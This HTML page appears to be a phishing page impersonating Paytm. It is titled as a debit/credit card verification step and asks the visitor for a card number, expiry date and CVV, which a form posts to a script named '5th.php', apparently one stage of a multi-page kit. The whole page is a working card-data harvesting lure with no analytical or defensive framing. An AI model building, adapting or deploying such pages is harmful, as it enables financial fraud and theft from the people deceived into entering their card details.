<!DOCTYPE html>
<html lang="eng">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>Paytm login - debit/credit card verificatin</title>
  <style>
    #ml
    {
      width:40%;
      margin-left:150px;
      position:absolute;
      top:12px;
    }
    #img
    {
       width:50%;
       margin-left:100px;
    }
    #aa
    {
    width: 260px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    height: 30px;
    background-color: white;
    border-style: solid;
    border-color:#01B9F5;
    border-width: 1px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #aa:hover
    {
    border-style: solid;
    border-color:#00B1F1;
    }
    #bb
    {
    width:40px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    line-height: 25px !important;
    height: 26px;
    background-color: white;
    border-style: solid;
    border-color:#01B9F5;
    border-width: 1px;
    border-radius: 0px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #bb:hover
    {
    border-style: solid;
    border-color:#00B1F1;
    }
    #cc
    {
    width:260px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    line-height: 25px !important;
    height: 26px;
    background-color: white;
    border-style: solid;
    border-color:#01B9F5;
    border-width: 1px;
    border-radius: 0px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #cc:hover
    {
    border-style: solid;
    border-color:#01B9F5;
    }
    #btn
    {
    width:170px;
    background-color:#01B9F5;
    color: white;
    margin-left:15px;
    border: solid black;
    border-radius: 2px;
    border-width: 0px;
    font-weight: bold;
    cursor: pointer;
    font-size: 15px;
    height:36px;
    }
    #ab
    {
    width:365px;
    margin:50px;
    border-bottom:solid #CCCCCC;
    border-width:1.2px;
    }
    </style>
    </head>
    <body onload="startTimer();">
    <div class="line">
    <b style="font-family:arial; font-size:20px; color:black; margin-left:70px;
    position:absolute;
    top:14px;">Login to</b></div>
    <img src="pbank.png" alt="" id="ml"><br><br>
    <div id="ab" 
    style="margin:10px; 
    margin-left:-8px;">
    </div><br>
    <form action="5th.php" method="post">
    <center><b style=" color:#01B9F5; font-size:18px; font-family:arial; margin:4px;">Credit card verification</b></center>
    </div>
    <center><b style=" color:solid black; font-size:15px; font-family:arial; margin:4px;">Please enter the details of Credit<br> Card number which you want to save in <br>Paytm account/wallet.</b></center>
    </div><br>
    <div id="zz">
    <b style="font-family:arial; color:#40464d; font-size:14px; margin-left:20px;">Enter Credit Card Number</b>
    </div>
    <div required="">
    <input type="tel" name="Card No. " id="aa" onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)" 
    placeholder="" required=""><br><br>
    <script>
    function formats(ele,e){
    if(ele.value.length<19){
    ele.value= ele.value.replace(/\W/g, '').replace(/(.{4})/g, '$1 ');
    return true;
    }else{
    return false;
    }
    }
    
    function numberValidation(e){
    e.target.value = e.target.value.replace(/[^\d ]/g,'');
    return false;
    }
    </script>
    </div>
    <div id="ee">
    <b style="font-family:arial; color:#40464d; font-size:14px; margin-left:20px;">Valid Thru/Expiry Date </b>
    </div>
    <span>
    <select name="Month" style="color:#40464d; border-color:#01B9F5; border-radius:4px; height:30px; width:60px; margin:10px; margin-left:20px; padding: 1px 5px;">
    <option value="01">01</option>
    <option value="02">02</option>
    <option value="03">03</option>
    <option value="04">04</option>
    <option value="05">05</option>
    <option value="06">06</option>
    <option value="07">07</option>
    <option value="08">08</option>
    <option value="09">09</option>
    <option value="10">10</option>
    <option value="11">11</option>
    <option value="12">12</option>
    </select>
    </span>
    <p1 style="color:#40464d;">/
    </p1> 
    <span>
    <select name="Year" style="color:#40464d; border-color:#01B9F5; border-radius:4px; height:30px; width:70px; margin-left:10px;padding: 1px 5px">
    <option value="2022">2022</option>
    <option value="2023">2023</option>
    <option value="2024">2024</option>
    <option value="2025">2025</option>
    <option value="2026">2026</option>
    <option value="2027">2027</option>
    <option value="2028">2028</option>
    <option value="2029">2029</option>
    <option value="2030">2030</option>
    <option value="2031">2031</option>
    <option value="2032">2032</option>
    <option value="2033">2033</option>
    <option value="2034">2034</option>
    <option value="2035">2035</option>
    <option value="2036">2036</option>
    <option value="2037">2037</option>
    <option value="2038">2038</option>
    <option value="2039">2039</option>
    <option value="2040">2040</option>
    <option value="2041">2041</option>
    <option value="2042">2042</option>
    <option value="2043">2043</option>
    <option value="2044">2044</option>
    <option value="2045">2045</option>
    <option value="2046">2046</option>
    <option value="2047">2047</option>
    <option value="2048">2048</option>
    <option value="2049">2049</option>
    <option value="2050">2050</option>
    
    /  </select>
    </span><br><br>
    <div id="ee">
    <b style="font-family:arial; color:#40464d; font-size:14px; margin-left:20px;">CVV Number</b><br>
    </div>
    <div id="ff">
    <input type="password" name="CVV" id="bb" placeholder="xxx" inputmode="numeric" 
    maxlength="3" pattern="[0-9]{3}" title="Please Enter Valid CVV/CVC Number!" required=""><br>
    </div>
    <img src="card.png" alt="" id="img"><br><br>
    <button type="submit" id="btn" style="font-weight:;">Continue Securely</button><br>
    </form>
    </body>
    </html>   